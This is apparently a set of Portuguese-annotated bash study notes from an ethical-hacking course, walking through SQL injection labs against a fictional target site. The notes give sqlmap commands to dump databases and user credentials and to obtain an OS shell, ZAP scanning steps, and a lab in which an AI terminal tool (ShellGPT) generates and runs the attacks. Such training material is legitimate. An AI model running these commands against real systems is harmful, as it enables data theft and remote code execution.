#!/bin/bash



###############
# MOD 15 - Lab 1: Perform SQL injection attacks
###############

########
# TASK 1: Perform an SQL injection attack against MSSQL to extract databases using sqlmap
########

# Coleta de Informações Iniciais
#   Ações realizadas:
#       Acessar o site alvo:
http://www.moviescope.com/
#       Fazer login com credenciais válidas:
#           Usuário: sam
#           Senha: test
#       Acessar a URL de perfil e copiar o cookie de sessão usando o console do navegador:
document.cookie
#   Importante: Este cookie é necessário para que o sqlmap autentique sua sessão e explore a aplicação logada.

# Enumeração de Bancos de Dados com sqlmap
#   Comando Principal:
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[COOKIE]" --dbs
#   Explicação dos parâmetros:
#       -u: URL vulnerável com parâmetro potencialmente injetável.
#       --cookie: valor do cookie da sessão copiado anteriormente.
#       --dbs: força o sqlmap a enumerar todos os bancos de dados disponíveis.

# Enumeração de Tabelas em um Banco de Dados Específico
#   Comando:
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[COOKIE]" -D moviescope --tables
#   Explicação:
#       -D moviescope: especifica o banco de dados chamado moviescope.
#       --tables: enumera todas as tabelas dentro desse banco.

# Dump dos Dados de uma Tabela (User_Login)
#   Comando:
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[COOKIE]" -D moviescope -T User_Login --dump
#   Explicação:
#       -T User_Login: seleciona a tabela User_Login.
#       --dump: extrai todos os dados da tabela (colunas como Uname, password, etc.).

# Teste de Acesso com Credenciais Vazadas
#   Ação:
#       Fazer login com algum usuário obtido, ex.:
#           Usuário: john
#           Senha: qwerty
#   Objetivo: Verificar se os dados extraídos são válidos e se permitem acesso indevido.

# Obter Shell do Sistema Operacional com sqlmap
#   Comando:
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[COOKIE]" --os-shell
#   Explicação:
#       --os-shell: tenta obter uma shell interativa do sistema operacional onde o banco de dados MSSQL está rodando (via RCE).
#   Após isso, você pode digitar comandos do SO diretamente no terminal.
#   Exemplos de comandos:
hostname     # Para identificar o nome do host
TASKLIST     # Para listar os processos em execução (equivalente ao gerenciador de tarefas do Windows)
help         # Lista os comandos suportados pelo sqlmap OS-shell

# Ferramentas Alternativas Mencionadas no Lab
#   Além do sqlmap, o lab cita outras ferramentas úteis para ataques de SQL Injection:
#       Mole	                Automatiza injeções SQL por linha de comando.
https://sourceforge.net 
#       jSQL Injection	        GUI baseada em Java para SQLi automatizado.
https://github.com 
#       NoSQLMap	            Ataques a bancos NoSQL (MongoDB, etc).
https://github.com 
#       Havij	                Ferramenta gráfica popular para SQLi (descontinuada oficialmente, mas ainda disponível).
https://github.com
#       blind_sql_bitshifting	Ataques Blind SQL usando manipulação de bits.
https://github.com



###############
# MOD 15 - Lab 2: Detect SQL injection vulnerabilities using various SQL injection detection tools
###############

########
# TASK 1: Detect SQL injection vulnerabilities using OWASP ZAP
########

# Objetivo
#   Utilizar OWASP ZAP para identificar vulnerabilidades de SQL Injection no site http://www.moviescope.com.

# Ferramenta Usada
#   OWASP ZAP (Zed Attack Proxy)
#       Plataforma: Windows Server 2019
#       Versão usada: ZAP 2.14.0
#       Função: Realiza scans automáticos e manuais para detectar falhas de segurança em aplicações web, incluindo SQL Injection, XSS, CSRF, etc.

# Acessar a Máquina-Alvo
#   Sistema: Windows Server 2019
#   Login:
#       Usuário: Administrator
#       Senha: Pa$$w0rd

# Iniciar o OWASP ZAP
#   Clique no ícone de busca do Windows.
#   Pesquisar:
Zap 2.14.0
#   Ao abrir o ZAP:
#       Se aparecer a pergunta:
#           “Do you want to persist the ZAP Session?”, marque:
No, I do not want to persist this session at this moment in time
#       Clique em Start.
#   Feche qualquer janela de Manage Add-ons, se aparecer.

# Executar o Escaneamento Automatizado
#   Na aba Quick Start, clique em Automated Scan.
#   Em URL to attack, digite:
http://www.moviescope.com
#   Clique em Attack para iniciar o Active Scan.

# Analisar Resultados do Escaneamento
#   Após o escaneamento:
#       Vá até a aba Alerts.
#       Procure por:
#           SQL Injection
#           SQL Injection - MsSQL
#       Expanda os nós e clique nos URLs vulneráveis.

# Ver Informações Detalhadas das Vulnerabilidades
#   Para cada entrada listada:
#       Risk:           Nível de risco da vulnerabilidade.
#       Confidence:     Grau de certeza de que a falha é real.
#       Parameter:      Qual parâmetro HTTP está vulnerável (ex: id, search, etc).
#       Attack:         Qual payload foi usado para testar (ex: ' OR '1'='1).
#       URL Afetada:    Endpoint vulnerável.

# Níveis de Risco Representados por Cores
# 🔴    Vermelha	Alto	        Risco crítico: SQLi com impacto grave
# 🟠    Laranja	    Médio	        Risco considerável
# 🟡    Amarela	    Baixo	        Pode indicar má prática
# 🔵    Azul	    Informacional	Vazamento de informações

# Conclusão da Análise com ZAP
#   OWASP ZAP detecta SQL Injections e exibe parâmetros vulneráveis, ataques utilizados e risco associado, permitindo que você:
#       Valide os pontos de injeção;
#       Documente falhas;
#       Reproduza manualmente ataques;
#       Corrija as vulnerabilidades com base nas evidências fornecidas.

# Ferramentas Alternativas para Detecção de SQL Injection
#   Você também pode usar outras ferramentas além do ZAP:
#       DSSS (Damn Small SQLi Scanner)	    Ferramenta leve, automatizada via terminal para SQLi
https://github.com
#       Burp Suite	                        Proxy + Scanner ativo, muito usado por pentesters
https://www.portswigger.net
#       Snort	                            IDS (sistema de detecção de intrusão) que detecta SQLi por assinatura
https://snort.org
#       HCL AppScan	                        Scanner corporativo para aplicações web, com foco em compliance
https://www.hcl-software.com
#       SQLMap	                            Automatiza exploração (visto no Lab 1), também pode detectar
#       Arachni	                            Scanner web automatizado com foco em segurança


###############
# MOD 15 - Lab 3: Perform SQL injection using AI
###############

########
# TASK 1: Perform SQL injection using ShellGPT
########


# Objetivo
#   Usar ShellGPT, uma interface baseada em GPT integrada ao terminal, para automatizar ataques de SQL Injection com ajuda da IA
#   Utilizar sqlmap como executor técnico dos ataques, a partir de comandos gerados por IA.

# Ferramentas Utilizadas
#   Parrot OS	                    Sistema operacional voltado para pentesting
#   ShellGPT (sgpt)	                Wrapper em terminal para usar GPT-3.5/4 em prompts
#   sqlmap	                        Ferramenta automatizada para detecção e exploração de SQLi
#   http://www.moviescope.com	    Alvo fictício vulnerável a SQLi
#   Firefox (Dev Tools)	            Utilizado para capturar o cookie de autenticação

# Visão Geral do Processo
#   graph TD
#       A[Login no Parrot OS] --> B[Abrir Terminal como Root]
#       B --> C[Iniciar ShellGPT]
#       C --> D[Capturar Cookie no navegador]
#       D --> E[Usar sgpt para gerar comandos SQLMap]
#       E --> F[Enumerar Bancos de Dados]
#       F --> G[Enumerar Tabelas da DB 'moviescope']
#       G --> H[Extrair dados da tabela User_Login]
#       H --> I[Testar login com as credenciais extraídas]

# Acessar a Máquina Parrot Security e Logar como root
#   login: attacker
#   senha: toor
#   Abra o terminal e torne-se root:
sudo su
#       Digite a senha: toor

# Iniciar o ShellGPT
bash sgpt.sh
#   Quando for solicitado:
Enter Your AI Activation Key:
#       Cole sua chave de ativação GPT (fornecida no módulo 00 ou PDF do lab) e pressione Enter.

# Capturar o Cookie de Autenticação do site
#   Acesse:
http://www.moviescope.com
#   Faça login como um usuário válido.
#   Pressione F12 para abrir as Ferramentas de Desenvolvedor do navegador.
#   Vá para a aba Storage → Cookies.
#   Copie o valor do cookie de sessão (ASP.NET_SessionId, por exemplo).

# Enumerar os Bancos de Dados com SQLMap via ShellGPT
sgpt --chat sql --shell "Use sqlmap on target url http://www.moviescope.com/viewprofile.aspx?id=1 with cookie value '[VALOR_DO_COOKIE]' and enumerate the DBMS databases"
#   Explicação:
#       sgpt --chat sql --shell "..." → Usa IA para gerar um comando shell válido com base em linguagem natural.
#       sqlmap ... enumerate the DBMS databases → A IA entenderá que precisa rodar um sqlmap com --dbs.
#   Quando solicitado:
Type 'E' to execute the command:
#   Digite:
E
#   Se aparecer:
#       Do you want to skip for other DBMSes? [Y/n]
#   Digite:
Y

# Listar Tabelas da Base moviescope
sgpt --chat sql --shell "Use sqlmap on target url http://www.moviescope.com/viewprofile.aspx?id=1 with cookie value '[VALOR_DO_COOKIE]' and enumerate the tables pertaining to moviescope database"
#   Explicação:
#       Aqui a IA entende que queremos:
#           sqlmap -u "http://..." --cookie="..." -D moviescope --tables

# Dump da Tabela User_Login
sgpt --chat sql --shell "Use sqlmap on target url http://www.moviescope.com/viewprofile.aspx?id=1 with cookie value '[VALOR_DO_COOKIE]' and retrieve User_Login table contents from moviescope database"
#   Explicação:
#       IA gera algo como:
#           sqlmap -u "http://..." --cookie="..." -D moviescope -T User_Login --dump
#   Resultado Esperado:
#       Coluna Uname: nomes de usuários (ex: steve)
#       Coluna password: senhas em texto puro (ex: password)

# Verificar o Login com as Credenciais Extraídas
#   Acesse novamente:
http://www.moviescope.com
#   Clique em Logout para iniciar nova sessão.
#       Faça login com:
#           Usuário: steve
#           Senha: password
#   Verifique se o login foi bem-sucedido.

# Por que isso funciona?
#   O site moviescope.com tem uma falha de SQL Injection no parâmetro id da URL:
/viewprofile.aspx?id=1
#   A sessão autenticada (com cookie) permite SQLMap explorar o backend do MSSQL.
#   A IA (ShellGPT) traduz linguagem natural para comandos SQLMap válidos, acelerando o processo.

# Outras ideias com ShellGPT para SQLi
#   Você pode pedir:
sgpt --chat sql --shell "Check if parameter id is vulnerable to time-based SQL injection"
sgpt --chat sql --shell "Enumerate columns of the table Admin_Logs"
sgpt --chat sql --shell "Check for writable tables in database moviescope"

# Conclusão
#   Este laboratório mostrou como:
#       A IA pode automatizar a geração de payloads inteligentes e comandos SQLMap.
#       Um atacante consegue usar GPT para explorar vulnerabilidades com eficiência e simplicidade.
#       Pentesters podem acelerar análises usando linguagem natural em ShellGPT.
